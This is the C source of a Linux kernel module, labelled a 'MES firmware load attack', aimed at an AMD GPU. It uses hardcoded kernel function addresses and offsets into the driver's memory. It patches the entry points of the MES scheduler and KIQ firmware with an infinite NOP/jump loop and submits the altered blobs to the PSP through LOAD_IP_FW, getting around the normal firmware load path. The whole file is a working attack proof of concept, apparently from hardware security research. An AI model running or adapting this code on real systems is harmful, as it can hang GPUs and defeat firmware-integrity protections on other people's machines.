/*
 * mes_load_attack.c — LOAD_IP_FW with patched MES firmware
 * 
 * PSP encrypts firmware during LOAD_IP_FW. Use the REAL MES blob,
 * patch the code section, submit via PSP ring. PSP encrypts + stores.
 * Then reset MES to pick up the new firmware.
 */
#include <linux/module.h>
#include <linux/pci.h>
#include <linux/delay.h>
#include <linux/slab.h>
MODULE_LICENSE("GPL");

struct psp_cmd { u32 buf_size, buf_version, cmd_id, r1,r2,r3,r4; u32 data[32]; u32 resp[16]; };
typedef int (*psp_fn)(void*, void*, struct psp_cmd*, u64);
typedef u32 (*rreg_fn)(void*, u32);
typedef void (*wreg_fn)(void*, u32, u32);

static int __init mla_init(void) {
    struct pci_dev *p = pci_get_device(0x1002,0x1586,NULL);
    void *a, *psp; psp_fn submit; rreg_fn rr; wreg_fn wr;
    struct psp_cmd *cmd; u64 fence_mc, fw_pri_mc;
    void *fw_pri; u32 gc=0x2800; int ret;

    if (!p) return -ENODEV;
    a=(u8*)pci_get_drvdata(p)-0x10;
    psp=(u8*)a+0x3B910;
    fw_pri=(void*)*(u64*)((u8*)psp+0x058);
    fw_pri_mc=*(u64*)((u8*)psp+0x050);
    fence_mc=*(u64*)((u8*)psp+0x1B8);
    submit=(psp_fn)0xFFFFFFFFC0F55840ULL;
    rr=(rreg_fn)0xFFFFFFFFC0E28460ULL;
    wr=(wreg_fn)0xFFFFFFFFC0E28820ULL;
    cmd=kzalloc(sizeof(*cmd),GFP_KERNEL);
    if (!cmd) { pci_dev_put(p); return -ENOMEM; }

    pr_info("mla: === MES FIRMWARE LOAD ATTACK ===\n");

    /* Load MES firmware (pipe 0 = scheduler) */
    {
        struct file *fp = filp_open("/tmp/mes_re/mes_pipe0.bin", O_RDONLY, 0);
        loff_t pos = 0; ssize_t n;
        if (IS_ERR(fp)) { pr_info("mla: no MES fw file\n"); goto done; }
        n = kernel_read(fp, fw_pri, 0xA0000, &pos); /* MES is ~643KB */
        filp_close(fp, NULL);
        pr_info("mla: Loaded %zd bytes of MES pipe0 firmware\n", n);

        /* Analyze MES firmware header */
        {
            u32 *h = (u32*)fw_pri;
            pr_info("mla: MES header: %08X %08X %08X %08X\n",
                h[0], h[1], h[2], h[3]);
            pr_info("mla: MES header: %08X %08X %08X %08X\n",
                h[4], h[5], h[6], h[7]);

            /* mes_firmware_header_v1_0:
             * common header (20 bytes = 5 DWORDs)
             * mes_ucode_version (4)
             * mes_ucode_size_bytes (4)
             * mes_ucode_offset_bytes (4)
             * mes_ucode_data_version (4)
             * mes_ucode_data_size_bytes (4)
             * mes_ucode_data_offset_bytes (4) */
            {
                u32 ucode_off = h[7]; /* mes_ucode_offset_bytes */
                u32 ucode_size = h[6]; /* mes_ucode_size_bytes */
                pr_info("mla: ucode_offset=0x%X ucode_size=0x%X (%u KB)\n",
                    ucode_off, ucode_size, ucode_size >> 10);

                if (ucode_off > 0 && ucode_off < n) {
                    u32 *code = (u32*)((u8*)fw_pri + ucode_off);
                    pr_info("mla: Code[0]: %08X %08X %08X %08X\n",
                        code[0], code[1], code[2], code[3]);

                    /* Patch: NOP loop at entry point */
                    pr_info("mla: Patching MES code at offset 0x%X...\n", ucode_off);
                    code[0] = 0x00000013; /* NOP */
                    code[1] = 0x00000013;
                    code[2] = 0x00000013;
                    code[3] = 0xFF5FF06F; /* JAL loop */
                    pr_info("mla: Patched MES entry point with NOP loop\n");
                }
            }
        }

        /* Submit LOAD_IP_FW for CP_MES (type 33) */
        memset(cmd,0,sizeof(*cmd));
        cmd->buf_size=sizeof(*cmd); cmd->buf_version=1;
        cmd->cmd_id=0x06;
        cmd->data[0]=lower_32_bits(fw_pri_mc);
        cmd->data[1]=upper_32_bits(fw_pri_mc);
        cmd->data[2]=n;
        cmd->data[3]=33; /* GFX_FW_TYPE_CP_MES */

        pr_info("mla: Submitting LOAD_IP_FW type=33 (CP_MES)...\n");
        ret=submit(psp,NULL,cmd,fence_mc);
        pr_info("mla: ret=%d resp=0x%X data[0-3]=%X %X %X %X\n",
            ret, cmd->resp[0], cmd->data[0], cmd->data[1], cmd->data[2], cmd->data[3]);

        /* Check MES state */
        wr(a, 0x1900, (3<<2)); /* GRBM: ME=3, PIPE=0 */
        udelay(200);
        { u32 pc = rr(a, gc+0x2813);
          u32 cntl = rr(a, gc+0x2807);
          pr_info("mla: After LOAD: MES PC=0x%04X CNTL=0x%X\n", pc, cntl); }
        wr(a, 0x1900, 0);

        /* Also load MES pipe1 (KIQ) */
        {
            struct file *fp1 = filp_open("/tmp/mes_re/mes_pipe1.bin", O_RDONLY, 0);
            if (!IS_ERR(fp1)) {
                pos = 0;
                n = kernel_read(fp1, fw_pri, 0xA0000, &pos);
                filp_close(fp1, NULL);
                pr_info("mla: Loaded %zd bytes of MES pipe1 (KIQ)\n", n);

                /* Patch KIQ entry too */
                { u32 *h2 = (u32*)fw_pri;
                  u32 ucode_off = h2[7];
                  if (ucode_off > 0 && ucode_off < n) {
                    u32 *code = (u32*)((u8*)fw_pri + ucode_off);
                    code[0]=0x00000013; code[1]=0x00000013;
                    code[2]=0x00000013; code[3]=0xFF5FF06F;
                  }
                }

                memset(cmd,0,sizeof(*cmd));
                cmd->buf_size=sizeof(*cmd); cmd->buf_version=1;
                cmd->cmd_id=0x06;
                cmd->data[0]=lower_32_bits(fw_pri_mc);
                cmd->data[1]=upper_32_bits(fw_pri_mc);
                cmd->data[2]=n;
                cmd->data[3]=34; /* GFX_FW_TYPE_MES_STACK / MES_KIQ */

                pr_info("mla: Submitting LOAD_IP_FW type=34 (MES_KIQ)...\n");
                ret=submit(psp,NULL,cmd,fence_mc);
                pr_info("mla: ret=%d resp=0x%X\n", ret, cmd->resp[0]);
            }
        }
    }

done:
    kfree(cmd); pci_dev_put(p);
    return 0;
}
static void __exit mla_exit(void) { pr_info("mla: unloaded\n"); }
module_init(mla_init); module_exit(mla_exit);
